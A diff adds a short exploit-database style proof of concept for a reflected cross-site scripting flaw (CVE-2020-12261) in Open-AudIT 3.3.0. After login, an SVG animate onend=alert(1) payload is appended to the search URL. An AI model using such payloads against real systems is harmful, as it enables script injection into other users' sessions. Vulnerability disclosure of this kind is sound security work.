@@ -1,0 +1,12 @@
+# Exploit Title: Open-AudIT 3.3.0 - Reflective Cross-Site Scripting (Authenticated)
+# Date: 2020-04-26
+# Exploit Author: Kamaljeet Kumar 
+# Vendor Homepage: https://opmantek.com/network-discovery-inventory-software/
+# Software Link: https://www.open-audit.org/downloads.php
+# Version: 3.3.0
+# CVE : CVE-2020-12261
+# POC:
+Step 1: Login to Open-Audit
+Step 2: Go to "http://192.168.0.4/open-audit/index.php/search/" and add this "<svg><animate onend=alert(1) attributeName=x dur=1s>" payload after the search, the URL look like: http://192.168.0.4/open-audit/index.php/search/<svg><animate onend=alert(1) attributeName=x dur=1s>
+
+Then we get the XSS pop up.
